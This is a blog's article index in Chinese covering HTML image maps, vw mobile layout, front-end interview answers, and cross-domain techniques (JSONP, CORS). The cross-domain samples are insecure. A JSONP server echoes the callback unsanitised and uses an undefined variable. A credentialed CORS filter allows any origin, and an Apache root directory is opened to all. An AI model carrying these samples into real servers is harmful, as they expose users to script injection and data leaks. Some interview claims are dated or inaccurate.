>标签有个局限，就是它不支持嵌套，如下面浏览器会将其解析为相邻兄弟关系，而不是父子关系： 1&lt;a href=\"#1\"&gt;11111111111&lt;a href=\"#2\"&gt;22222222222&lt;/a&gt;&lt;/a&gt; 如果我们有链接嵌套的需求，如下图：黄色区域点击是去“书详情页”，而点击列表其它任意区域是去“阅读页” 传统方法，比较好是改变视觉DOM结构和顺序，使链接内容变成相邻关系，再通过CSS重新布局定位，虽然麻烦了点，但至少语义和无障碍访问这一块还是很好的；比较次的方法是使用JS，点击目标区域preventDefault阻止默认事件，然后再location.href跳转之类。 一种更好的做法，就是&lt; a >元素中嵌套&lt; area >元素，可以保证DOM结构符合视觉呈现，又无需JS辅助: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253CSS代码：.book-title &#123; position:relative;&#125;.book-title &gt; .area &#123; position: absolute; left: 0; top: 0; width: 100%; height: 100%;&#125;HTML代码：&lt;a href=\"/book/1003477570/369104934\" class=\"book-layout\" target=\"_blank\"&gt; &lt;img src=\"book.jpg\" class=\"book-cover\" alt=\"都市猎人 限时免费\" usemap=\"#bookCover\"&gt; &lt;map id=\"bookCover\" name=\"bookCover\"&gt; &lt;area shape=\"rect\" coords=\"0,0,54,72\" href=\"/book/1003477570\" alt=\"都市猎人 限时免费\" target=\"_blank\"&gt; &lt;/map&gt; &lt;div class=\"book-cell\"&gt; &lt;div class=\"book-title-x\"&gt; &lt;h4 class=\"book-title\"&gt; &lt;area class=\"area\" href=\"/book/1003477570\" target=\"_blank\"&gt; 都市猎人 &lt;/h4&gt; &lt;div class=\"book-title-r\"&gt;继续阅读&lt;/div&gt; &lt;/div&gt; &lt;div class=\"book-meta\"&gt;都市猎人 | 读至第六百四十二章 不在意章&lt;/div&gt; &lt;div class=\"book-meta\"&gt; &lt;time class=\"book-meta-r\"&gt;1天前&lt;/time&gt;更新至 第六百四十二章 不在意 &lt;/div&gt; &lt;/div&gt;&lt;/a&gt;&lt;a href=\"/book/1003477570/369104934\" class=\"book-layout\" target=\"_blank\"&gt; &lt;img src=\"book.jpg\" class=\"book-cover\" alt=\"都市猎人 限时免费\" usemap=\"#bookCover\"&gt; &lt;map id=\"bookCover\" name=\"bookCover\"&gt; &lt;area shape=\"rect\" coords=\"0,0,200,21\" href=\"/book/1003477570\" alt=\"都市猎人 限时免费\" target=\"_blank\"&gt; &lt;/map&gt; &lt;div class=\"book-cell\"&gt; &lt;div class=\"book-title-x\"&gt; &lt;h4 class=\"book-title\"&gt; &lt;img src=\"data:image/gif;base64,R0lGODlhEAAQAIAAAP///wAAACH5BAEAAAAALAAAAAAQABAAAAIOhI+py+0Po5y02ouzPgUAOw==\" class=\"area\" usemap=\"#mapTitle\"&gt; 都市猎人 &lt;/h4&gt; &lt;map id=\"mapTitle\" name=\"mapTitle\"&gt; &lt;area shape=\"rect\" coords=\"0,0,54,72\" href=\"/book/1003477570\" target=\"_blank\"&gt; &lt;/map&gt; &lt;div class=\"book-title-r\"&gt;继续阅读&lt;/div&gt; &lt;/div&gt; &lt;div class=\"book-meta\"&gt;都市猎人 | 读至第六百四十二章 不在意章&lt;/div&gt; &lt;div class=\"book-meta\"&gt; &lt;time class=\"book-meta-r\"&gt;1天前&lt;/time&gt;更新至 第六百四十二章 不在意 &lt;/div&gt; &lt;/div&gt;&lt;/a&gt; 截图： 代码中第一个a： 脱离map的裸露的area元素实际上也是可以点击跳转了，就像一个a链接元素一样。但area元素不支持子元素，所以只能覆盖。但它却支持伪元素，也就是，如果单看视觉表现，你也可以让标题文字借助:before等伪元素实现。然而，这种直接使用area元素覆盖的方法有一些局限，一是Firefox浏览器不支持（Firefox的area元素默认display:none，且无法重置）；另外一个问题就是无法使用键盘Tab索引访问，如果没有外面的a元素是可以的，有了之后，这种取巧的做法就不行了。 代码中第二个a： 如果你的项目兼容性要求比较高，对无障碍访问要求也比较高，则建议使用透明图片覆盖的方式实现文字的链接嵌套，即把原本裸露的area换成img，然后再使用area元素创建图片热点。这样各大浏览器便可兼容了。 3、结束语 对于Chrome以及IE9+浏览器可以对元素进行样式设置，而Firefox4之后就不可以，有待关注。 标注： 本文来自牛客网，第三点来自http://www.zhangxinxu.com/wordpress/2017/05/html-area-map/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-考题","slug":"前端-考题","permalink":"http://liuxuewen-site.github.io/tags/前端-考题/"}]},{"title":"再聊移动端适配之vw、vh","slug":"mobile-bs-vwvh","date":"2018-02-02T02:41:10.000Z","updated":"2019-01-25T10:13:19.899Z","comments":true,"path":"2018/02/02/mobile-bs-vwvh/","link":"","permalink":"http://liuxuewen-site.github.io/2018/02/02/mobile-bs-vwvh/","excerpt":"","text":"一、引言 &emsp;&emsp;Flexible到今天也有几年的历史了，解决了适配终端的很多问题，这套方案相对而言是一个较为成熟的方案。但它并不是万能的，也不是最优秀的，他还是存在一些问题的，比如iframe的引用，有时候就把我们自己给埋进去了。下面将介绍一种新的适配方案。 先上这套适配的效果看看： iPhone系列效果 部分Android效果 上面的Demo，测试了Top30的机型。目前未得到支持的： 二、适配方案 在移动端布局，我们需要面对两个最为重要的问题： 1）各终端下的适配问题 2）Retina屏的细节处理 不同的终端，我们面对的屏幕分辨率、DPR、1px、2x图等一系列的问题。这个布局方案也是针对性的解决这些问题，只不过解决这些问题不再是使用Hack手段（flexible）来处理，而是直接使用原生的CSS技术来处理的。 三、终端适配 以前的Flexible方案是通过JavaScript来模拟vw的特性，今天vw已经得到了众多浏览器的支持，即可以考虑将vw单位运用于我们的适配布局中。 vw是基于Viewport视窗的长度单位，这里的视窗（Viewport）指的就是浏览器可视化的区域，而这个可视区域是window.innerWidth/window.innerHeight的大小，关于viewpoint可看 这里。用下图简单的来示意一下： 和Viewport相关的单位有四个，分别为vw、vh、vmin和vmax: 1）vw：是Viewport’s width的简写,1vw等于window.innerWidth的1% 2）vh：是Viewport’s height的简写，1vh等于window.innerHeihgt的1% 3）vmin：vmin的值是当前vw和vh中较小的值 4）vmax：vmax的值是当前vw和vh中较大的值 vmin和vmax是根据Viewport中长度偏大的那个维度值计算出来的，如果window.innerHeight &gt; window.innerWidth则vmin取百分之一的window.innerWidth，vmax取百分之一的window.innerHeight计算。看图： 所以在这个方案中大胆的使用vw来替代以前Flexible中的rem缩放方案。回归到我们的实际业务中来，目前出视觉设计稿，都是使用750px宽度的，从上面的原理来看，那么100vw = 750px，即1vw = 7.5px。那么我们可以根据设计图上的px值直接转换成对应的vw值。 看到这里，跟flexible一样又要计算，同样可以使用PostCSS的插件 postcss-px-to-viewport ，让我们可以直接在代码中写px，比如： 12345678910111213[w-369]&#123; width: 369px; &#125; [w-369] h2 span &#123; background: #FF5000; color: #fff; display: inline-block; border-radius: 4px; font-size: 20px; text-shadow: 0 2px 2px #FF5000; padding: 2px 5px; margin-right: 5px; &#125; PostCSS编译之后就是我们所需要的带vw代码： 123456789101112131415[w-369] &#123; width: 49.2vw; &#125; [w-369] h2 span &#123; background: #ff5000; color: #fff; display: inline-block; border-radius: .53333vw; text-shadow: 0 0.26667vw 0.26667vw #ff5000; padding: .26667vw .66667vw; &#125; [w-369] h2 span, [w-369] i &#123; font-size: 2.66667vw; margin-right: .66667vw; &#125; 在实际使用的时候，你可以对该插件进行相关的参数配置： 123456789\"postcss-px-to-viewport\": &#123; viewportWidth: 750, viewportHeight: 1334, unitPrecision: 5, viewportUnit: 'vw', selectorBlackList: [], minPixelValue: 1, mediaQuery: false &#125; 假设你的设计稿不是750px而是1125px，那么你就可以修改vewportWidth的值。有关于该插件的详细介绍，可以阅读其 官方使用文档 。 上面解决了px到vw的转换计算。那么在哪些地方可以使用vw来适配我们的页面。根据相关的测试： 1）容器适配，可以使用vw 2）文本的适配，可以使用vw 3）大于1px的边框、圆角、阴影都可以使用vw 4）内距和外距，可以使用vw 另外有一个细节需要特别的提出，比如我们有一个这样的设计： 如果我们直接使用： 123456[w-188-246] &#123; width: 188px; &#125; [w-187-246]&#123; width: 187px &#125; 最终的效果会造成[w-187-246]容器的高度小于[w-188-246]容器的高度。这个时候我们就需要考虑到 容器的长宽比缩放 。推荐一个PostCSS插件 postcss-aspect-ratio-mini ,这个插件使用很简单，不需要做任何的配置，你只需要本地安装一下就OK。使用的时候如下： 12345678910111213141516171819202122[aspectratio] &#123; position: relative; &#125; [aspectratio]::before &#123; content: &apos;&apos;; display: block; width: 1px; margin-left: -1px; height: 0; &#125; [aspectratio-content] &#123; position: absolute; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%; &#125; [aspectratio][aspect-ratio=&quot;188/246&quot;]&#123; aspect-ratio: &apos;188:246&apos;; &#125; 编译出来： 123[aspectratio][aspect-ratio=\"188/246\"]:before &#123; padding-top: 130.85106382978725%; &#125; 关于实现长宽比的效果，可以阅读相关文章: CSS实现长宽比的几种方案 容器长宽比 Web中如何实现纵横比 实现精准的流体排版原理 四、解决1px方案 前面提到过，对于1px是不建议将其转换成对应的vw单位的，但在Retina下，我们始终是需要面对如何解决1px的问题。在《再谈Retina下1px的解决方案》文章中提供了多种解决1px的方案。在这里推荐另外一种解决1px的方案，依旧是使用PostCSS插件，解决1px可以使用 postcss-write-svg 。 使用postcss-write-svg你可以通过border-image或者background-image两种方式来处理。 border-image比如： 1234567891011@svg 1px-border &#123; height: 2px; @rect &#123; fill: var(--color, black); width: 100%; height: 50%; &#125; &#125; .example &#123; border: 1px solid transparent; border-image: svg(1px-border param(--color #00b1ff)) 2 2 stretch; &#125; 这样PostCSS会自动帮你把CSS编译出来： 1234.example &#123; border: 1px solid transparent; border-image: url(\"data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' height='2px'%3E%3Crect fill='%2300b1ff' width='100%25' height='50%25'/%3E%3C/svg%3E\") 2 2 stretch; &#125; background-image比如： 12345678910@svg square &#123; @rect &#123; fill: var(--color, black); width: 100%; height: 100%; &#125; &#125; #example &#123; background: white svg(square param(--color #00b1ff)); &#125; 编译出来就是： 123#example &#123; background: white url(\"data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3Crect fill='%2300b1ff' width='100%25' height='100%25'/%3E%3C/svg%3E\"); &#125; 五、总结 这个方案简单易用，测试下来，基本能达到所需的需求，有一点千万别忘了，记得在中添加： 1&lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no\" /&gt; 这里使用了多个PostCSS的插件，能帮助我们解决很多问题。在W3cplus提供了一些有关于 PostCSS 相关的文章。《深入PostCSS Web设计》 一书也有更深讲解。 六、降级处理 前面提到过，到目前为止，T30的机型中还有几款机型是不支持vw的适配方案。那么如果业务需要，应该怎么处理呢？有两种方式可以进行降级处理： 1）CSS Houdini：通过 CSS Houdini 针对vw做处理，调用 CSS Typed OM Level1 提供的 CSSUnitValue API 。 2）CSS Polyfill：通过相应的Polyfill做相应的处理，目前针对于vw单位的Polyfill主要有：vminpoly 、Viewport Units Buggyfill 、vunits.js 和 Modernizr 。推荐采用Viewport Units Buggyfill。 七、Viewport不足之处 采用vw来做适配处理并不是只有好处没有任何缺点。有一些细节之处还是存在一定缺陷的。 比如当容器使用vw单位，margin采用px单位时，很容易造成整体宽度超过100vw，从而影响布局效果。对于类似这样的现象，我们可以采用相关的技术进行规避。比如将margin换成padding，并且配合box-sizing。只不过这不是最佳方案，随着将来浏览器或应用自身的Webview对calc()函数的支持之后，碰到vw和px混合使用的时候，可以结合calc()函数一起使用，这样就可以完美的解决。 另外一点，px转换成vw单位，多少还会存在一定的像素差，毕竟很多时候无法完全整除。 此外，兼容性方面还是需要改进…… 当然还有…… 标注： 参考资料1：https://www.w3cplus.com/css/vw-for-layout.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-移动端适配","slug":"前端-移动端适配","permalink":"http://liuxuewen-site.github.io/tags/前端-移动端适配/"}]},{"title":"前端基础考题2","slug":"frontEnd-basic2","date":"2018-02-01T14:22:19.000Z","updated":"2019-01-25T10:04:25.971Z","comments":true,"path":"2018/02/01/frontEnd-basic2/","link":"","permalink":"http://liuxuewen-site.github.io/2018/02/01/frontEnd-basic2/","excerpt":"","text":"一、什么是WebGL,它有什么作用以及优点? &emsp;&emsp;WebGL（Web Graphics Library ）是一种 3D 绘图标准，这种绘图技术标准允许把 JavaScript 和 OpenGL ES 2.0 结合在一起，通过增加 OpenGL ES 2.0 的一个 JavaScript 绑定， WebGL 可以为 HTML5 Canvas 提供硬件 3D 加速渲染，这样 Web 开发人员就可以借助系统显卡来在浏览器里更流畅地展示 3D 场景和模型，还能创建复杂的导航和数据视觉化。 &emsp;&emsp;WebGL 技术标准免去了开发网页专用渲染插件的麻烦，可被用于创建具有复杂 3D 结构的网站页面，甚至可以用来设计 3D 网页游戏等。因为原生的 WebGL 很复杂，我们经常会使用一些三方的库，如 three.js 等，这些库多数用于 HTML5 游戏开发。 &emsp;&emsp;WebGL完美地解决了现有的 Web 交互式三维动画的两个问题： 第一，它通过HTML脚本本身实现 Web 交互式三维动画的制作，无需任何浏览器插件支持 ; 第二，它利用底层的图形硬件加速功能进行的图形渲染，是通过统一的、标准的、跨平台的OpenGL接口实现的。 二、说说你对SVG理解? SVG可缩放矢量图形（ Scalable Vector Graphics ）是基于可扩展标记语言（ XML ）、用于描述二维矢量图形的一种图形格式。 是W3C在2000年8月制定的一种新的二维矢量图形格式，也是规范中的网络矢量图形标准。 SVG 严格遵从 XML 语法，并用文本格式的描述性语言来描述图像内容，因此是一种和图像分辨率无关的矢量图形格式。 特点： (1)任意放缩：用户可以任意缩放图像显示，而不会破坏图像的清晰度、细节等。 (2)文本独立：SVG图像中的文字独立于图像，文字保留可编辑和可搜寻的状态。也不会再有字体的限制，用户系统即使没有安装某一字体，也会看到和他们制作时完全相同的画面。 (3)较小文件：总体来讲，SVG文件比那些 GIF 和 JPEG 格式的文件要小很多，因而下载也很快。 (4)超强显示效果：SVG图像在屏幕上总是边缘清晰，它的清晰度适合任何屏幕分辨率和打印分辨率。 (5)超级颜色控制：SVG图像提供一个 1600 万种颜色的调色板，支持 ICC 颜色描述文件标准、 RGB 、线 X 填充、渐变和蒙版。 (6)交互 X 和智能化。 SVG 面临的主要问题一个是如何和已经占有重要市场份额的矢量图形格式 Flash 竞争的问题，另一个问题就是 SVG 的本地运行环境下的厂家支持程度。 浏览器支持： Internet Explorer9，火狐，谷歌 Chrome ， Opera 和 Safari 都支持 SVG 。 IE8和早期版本都需要一个插件 - 如 Adobe SVG 浏览器，这是免费提供的。 三、link和@import的区别? link使用： 1&lt;link rel='stylesheet' rev='stylesheet' href='CSS文件 ' type='text/css' media='all' /&gt; @import使用 123&lt;style type='text/css' media='screen'&gt;@import url('CSS文件 ');&lt;/style&gt; 两者都是外部引用CSS的方式，但是存在一定的区别： 区别1： link 是 XHTML 标签，除了加载 CSS 外，还可以定义 RSS 等其他事务； @import 属于 CSS 范畴，只能加载 CSS 。 区别2： link 引用 CSS 时，在页面载入时同时加载； @import 需要页面网页完全载入以后加载。 区别3： link 是 XHTML 标签，无兼容问题； @import 是在 CSS2.1 提出的，低版本的浏览器不支持。 区别4： link 支持使用 Javascript 控制 DOM 去改变样式；而 @import 不支持。 区别5： link方式的样式权重高于@import的权重。 四、src与href的区别？ 1）src用于替换当前元素， href用于在当前文档和引用资源之间确立联系。 2）src是source的缩写，指向外部资源的位置。在请求src资源时会将其指向的资源下载并应用到文档内，指向的内容将会嵌入到文档中当前标签所在位置。例如js脚本，img图片和frame等元素。 当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部。 3）href是Hypertext Reference 的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接。 如果我们在文档中添加&lt; link href=’common.css’ rel=’stylesheet’/ >那么浏览器会识别该文档为css文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用 link 方式来加载 css ，而不是使用 @import 方式。 五、title与h、b与strong、i与em，其区别？ 1）title表示标题，但没有明确意义； H1表示层次明确的标题，对页面信息的抓取有很大的影响； 2）b只是展示强调内容；strong标明重点内容，有语气加强的含义； 3）i内容展示为斜体； em表示强调的文本； Physical Style Elements – 自然样式标签： b, i, u, s, pre Semantic Style Elements – 语义样式标签： strong, em, ins, del, code 应该准确使用语义样式标签, 但不能滥用 , 如果不能确定时首选使用自然样式标签。 六、不使用border画出1px高的线，在不同浏览器的标准模式与怪异模式下都能保持一致的效果？ 1&lt;div style=\"width:100%;height:1px;background-color:black\"&gt;&lt;/div&gt; 七、img的title和alt有什么区别？ Alt 用于图片无法加载时显示。 Title 为该属性提供信息，通常当鼠标滑动到元素上的时候显示。 八、表单的基本组成部分有哪些，表单主要用途是什么？ 1）组成：表单标签、表单域、表单按钮 a、表单标签：这里面包含了处理表单数据所用CGI程序的URL, 以及数据提交到服务器的方法。 b、表单域：包含了文本框、密码框、隐藏域、多行文本框、复选框、单选框、下拉选择框、和文件上传框等。 c、表单按钮：包括提交按钮，复位按钮和一般按钮；用于将数据传送到服务器上的CGI脚本或者取消输入，还可以用表单按钮来控制其他定义了处理脚本的处理工作。 2）主要用途：表单在网页中主要负责数据采集的功能，和向服务器传送数据。 九、表单提交中Get和Post方式的区别？ 原理性区别： 1）Http定义的与服务器交互的四种基本方法 - - 增删改查； 从定义而言get用于信息获取（状态不做迁移），是安全幂等的（即不修改信息、同一url多次请求结果一致），比如腾讯新闻的刷新操作； 而post用于信息传送，可以修改服务器上的资源请求（资源的状态迁移），比如新闻评论的提交，提交前后资源被修改了。 2）关于幂等与否只是 http 的规定，实际中要看服务器端怎么写。 表象上区别： 1）get将表单中数据的按照 variable=value 的形式，添加到action所指向的URL后面，并且两者使用“ ? ”连接，而各个变量之间使用“ &amp; ”连接（明文提交）；post是将表单中的数据放在form的数据体中，按照变量和值相对应的方式，传递到action所指向URL,用户看不到这个过程。 2）get传送的数据量较小，不能大于2KB。post传送的数据量较大，一般被默认为不受限制。但理论上，IIS4中最大量为80KB，IIS5中为100KB。 3）get方式服务器端用Request.QueryString获取变量的值，post方式服务器端用Request.Form获取提交的数据。 4）get限制Form表单的数据集的值必须为ASCII字符；而post支持整个ISO10646字符集. 6）get安全性低，post安全性较高。 7）传输信息所在http中的位置不同：Post的信息作为http请求的内容，而Get是在Http头部传输的，get 请求可以有body但大多数服务器不会解析get请求的body。 标注： 本文来自牛客网","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-考题","slug":"前端-考题","permalink":"http://liuxuewen-site.github.io/tags/前端-考题/"}]},{"title":"跨域","slug":"server-bs-crossDomain","date":"2018-02-01T02:02:26.000Z","updated":"2019-01-25T10:20:11.168Z","comments":true,"path":"2018/02/01/server-bs-crossDomain/","link":"","permalink":"http://liuxuewen-site.github.io/2018/02/01/server-bs-crossDomain/","excerpt":"","text":"一、跨域 跨域指一个域下的文档或脚本试图去请求另一个域下的资源。跨域出错主要原因是浏览器的“同源策略”。 跨域有ajax跨域、Cookie跨域、iframe跨域、LocalStorage跨域等。 二、同源策略 &emsp;&emsp;设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。 如果其他网站可以读取A网站的 Cookie，会发生什么？ 很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。 更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为，因为浏览器同时还规定，提交表单不受同源政策的限制。 &emsp;&emsp;由此可见，”同源政策”是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。 &emsp;&emsp;同源策略/SOP（Same origin policy）是一种约定，由Netscape公司1995年引入浏览器，它是浏览器最核心也最基本的安全功能，保证用户信息的安全，防止恶意的网站窃取数据。如果缺少了同源策略，浏览器很容易受到XSS、CSFR等攻击。所谓同源是指”协议+域名+端口”三者相同，即便两个不同的域名指向同一个ip地址，也非同源。 &emsp;&emsp;同源策略限制以下几种行为： 1.) Cookie、LocalStorage 和 IndexDB 无法读取；2.) DOM 和 Js对象无法获得；3.) AJAX 请求不能发送。 三、常见跨域场景 四、ajax跨域的表现 第一种现象: 12No 'Access-Control-Allow-Origin' header is present on the requested resource,并且The response had HTTP status code 404 出现这种情况的原因如下： 1）本次ajax请求是“非简单请求”,所以请求前会发送一次预检请求(OPTIONS) 2）服务器端后台接口没有允许OPTIONS请求,导致无法找到对应接口地址 解决方案: 后端允许options请求 第二种现象: 12No 'Access-Control-Allow-Origin' header is present on the requested resource,并且The response had HTTP status code 405 出现这种情况的原因如下： 1）后台方法允许OPTIONS请求,但是一些配置文件中(如安全配置),阻止了OPTIONS请求。 解决方案: 后端关闭对应的安全配置 第三种现象: 12No 'Access-Control-Allow-Origin' header is present on the requested resource,并且status 200 出现这种情况的原因如下： 1）服务器端后台允许OPTIONS请求,并且接口也允许OPTIONS请求,但是头部匹配时出现不匹配现象。比如origin头部检查不匹配,比如少了一些头部的支持(如常见的X-Requested-With头部),然后服务端就会将response返回给前端,前端检测到这个后就触发XHR.onerror,导致前端控制台报错 解决方案: 后端增加对应的头部支持 第四种现象: 1heade contains multiple values '*,*' 表现现象是，后台响应的http头部信息有两个Access-Control-Allow-Origin:*，主要原因是进行了跨域配置重复。 出现这种情况的原因如下： 1）常见于.net后台( 一般在web.config中配置了一次origin,然后代码中又手动添加了一次origin(比如代码手动设置了返回* ) ) 2）常见于.net后台(在IIS和项目的webconfig中同时设置Origin:*) 解决方案(对应): 1）建议删除代码中手动添加的*，只用项目配置中的即可 2）建议删除IIS下的配置*，只用项目配置中的即可 五、跨域解决方案1、JSONP JSONP之所以能够用来解决跨域方案,主要是因为&lt; script >脚本拥有跨域能力,JSONP正是利用这一点来实现。 具体原理： 实现流程： 客户端网页通过添加一个&lt; script >元素，向服务器请求JSON数据，这种做法不受同源政策限制 1.）原生实现 12345678910111213&lt;script&gt; var script = document.createElement('script'); script.type = 'text/javascript'; // 传参并指定回调执行函数为onBack script.src = 'http://www.domain2.com:8080/login?user=admin&amp;callback=onBack'; document.head.appendChild(script); // 回调执行函数 function onBack(res) &#123; alert(JSON.stringify(res)); &#125;&lt;/script&gt; 请求时,接口地址是作为构建出的脚本标签的src的,这样,当脚本标签构建出来时,最终的src是接口返回的内容 2.）jquery ajax 1234567$.ajax(&#123; url: 'http://www.domain2.com:8080/login', type: 'get', dataType: 'jsonp', // 请求方式为jsonp jsonpCallback: \"onBack\", // 自定义回调函数名 data: &#123;&#125;&#125;); 3.）vue.js 123456this.$http.jsonp('http://www.domain2.com:8080/login', &#123; params: &#123;&#125;, jsonp: 'onBack'&#125;).then((res) =&gt; &#123; console.log(res); &#125;) 服务端返回，对应的接口在返回参数外面添加函数包裹层 onBack({“status”: true, “user”: “admin”}) 1.）后端node.js代码示例 1234567891011121314151617var querystring = require('querystring');var http = require('http');var server = http.createServer();server.on('request', function(req, res) &#123; var params = qs.parse(req.url.split('?')[1]); var fn = params.callback; // jsonp返回设置 res.writeHead(200, &#123; 'Content-Type': 'text/javascript' &#125;); res.write(fn + '(' + JSON.stringify(params) + ')'); res.end();&#125;);server.listen('8080');console.log('Server is running at port 8080...'); 注意,一般的JSONP接口和普通接口返回数据是有区别的,所以接口如果要做JSONO兼容,需要进行判断是否有对应callback关键字参数,如果有则是JSONP请求,返回JSONP数据,否则返回普通数据。 基于JSONP的实现原理,所以JSONP只能是“GET”请求,不能进行较为复杂的POST和其它请求(所以如今它也基本被淘汰了) 2、CORS CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。 基本上目前所有的浏览器都实现了CORS标准,其实目前几乎所有的浏览器ajax请求都是基于CORS机制的,所以说其实现在CORS解决方案主要是考虑后台该如何实现的问题。 具体原理： 简单请求与非简单请求： 浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。只要同时满足以下两大条件，就属于简单请求。 1）请求方法是以下三种方法之一：HEAD,GET,POST 2）HTTP的头信息不超出以下几种字段： &emsp;&emsp;Accept &emsp;&emsp;Accept-Language &emsp;&emsp;Content-Language &emsp;&emsp;Last-Event-ID &emsp;&emsp;Content-Type(只限于三个值application/x-www-form-urlencoded、 multipart/form-data、text/plain) 凡是不同时满足上面两个条件，就属于非简单请求。 普通跨域请求与带cookie请求： 1）普通跨域请求：只服务端设置Access-Control-Allow-Origin即可，前端无须设置。 2）带cookie请求：前后端都需要设置字段，需注意：所带cookie为跨域请求接口所在域的cookie，而非当前页。 实现流程： 前端设置 1.）原生ajax 1234567891011121314var xhr = new XMLHttpRequest(); // IE8/9需用window.XDomainRequest兼容// 前端设置是否带cookiexhr.withCredentials = true;xhr.open('post', 'http://www.domain2.com:8080/login', true);xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');xhr.send('user=admin');xhr.onreadystatechange = function() &#123; if (xhr.readyState == 4 &amp;&amp; xhr.status == 200) &#123; alert(xhr.responseText); &#125;&#125;; 2.）jQuery ajax 12345678$.ajax(&#123; ... xhrFields: &#123; withCredentials: true // 前端设置是否带cookie &#125;, crossDomain: true, // 会让请求头中包含跨域的额外信息，但不会含cookie ...&#125;); 3.）vue框架在vue-resource封装的ajax组件中加入以下代码： 1Vue.http.options.credentials = true 服务端设置(主要) 1.）PHP后台配置 第一步 配置Php 后台允许跨域 1234&lt;?phpheader('Access-Control-Allow-Origin: *');header('Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept');//主要为跨域CORS配置的两大基本信息,Origin和headers 第二步 配置Apache web服务器跨域(httpd.conf中) 12345678910111213原始代码：&lt;Directory /&gt; AllowOverride none Require all denied&lt;/Directory&gt;修改为：&lt;Directory /&gt; Options FollowSymLinks AllowOverride none Order deny,allow Allow from all&lt;/Directory&gt; 2.）Node.js后台配置(express框架) 1234567891011121314app.all('*', function(req, res, next) &#123; res.header(\"Access-Control-Allow-Origin\", \"*\"); res.header(\"Access-Control-Allow-Headers\", \"X-Requested-With\"); res.header(\"Access-Control-Allow-Methods\", \"PUT,POST,GET,DELETE,OPTIONS\"); res.header(\"X-Powered-By\", ' 3.2.1') //这段仅仅为了方便返回json而已 res.header(\"Content-Type\", \"application/json;charset=utf-8\"); if(req.method == 'OPTIONS') &#123; //让options请求快速返回 res.sendStatus(200); &#125; else &#123; next(); &#125;&#125;); 3.）JAVA后台配置 第一步 获取依赖jar包： 下载 cors-filter-1.7.jar , java-property-utils-1.9.jar 这两个库文件放到lib目录下。(放到对应项目的webcontent/WEB-INF/lib/下) 第二步 如果项目用了Maven构建的,请添加如下依赖到pom.xml中:(非maven请忽视) 12345&lt;dependency&gt; &lt;groupId&gt;com.thetransactioncompany&lt;/groupId&gt; &lt;artifactId&gt;cors-filter&lt;/artifactId&gt; &lt;version&gt;[ version ]&lt;/version&gt; //其中版本应该是最新的稳定版本,CORS过滤器&lt;/dependency&gt; 第三步 添加CORS配置到项目的Web.xml中( App/WEB-INF/web.xml)注意,配置请放到web.xml的前面,作为第一个filter存在(可以有多个filter的) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;!-- 跨域配置--&gt; &lt;filter&gt; &lt;!-- The CORS filter with parameters --&gt; &lt;filter-name&gt;CORS&lt;/filter-name&gt; &lt;filter-class&gt;com.thetransactioncompany.cors.CORSFilter&lt;/filter-class&gt; &lt;!-- Note: All parameters are options, if omitted the CORS Filter will fall back to the respective default values. --&gt; &lt;init-param&gt; &lt;param-name&gt;cors.allowGenericHttpRequests&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;cors.allowOrigin&lt;/param-name&gt; &lt;param-value&gt;*&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;cors.allowSubdomains&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;cors.supportedMethods&lt;/param-name&gt; &lt;param-value&gt;GET, HEAD, POST, OPTIONS&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;cors.supportedHeaders&lt;/param-name&gt; &lt;param-value&gt;Accept, Origin, X-Requested-With, Content-Type, Last-Modified&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;cors.exposedHeaders&lt;/param-name&gt; &lt;!--这里可以添加一些自己的暴露Headers --&gt; &lt;param-value&gt;X-Test-1, X-Test-2&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;cors.supportsCredentials&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;cors.maxAge&lt;/param-name&gt; &lt;param-value&gt;3600&lt;/param-value&gt; &lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;!-- CORS Filter mapping --&gt; &lt;filter-name&gt;CORS&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; 第四步 可能的安全模块配置错误(注意，某些框架中-譬如公司私人框架，有安全模块的，有时候这些安全模块配置会影响跨域配置，这时候可以先尝试关闭它们) 4.）JAVA Spring Boot配置 仅列举简单的全局配置。新建配置，然后添加Configuration注解即可配置成功 1234567891011121314151617181920212223@Configurationpublic class CorsConfig &#123; private CorsConfiguration buildConfig() &#123; 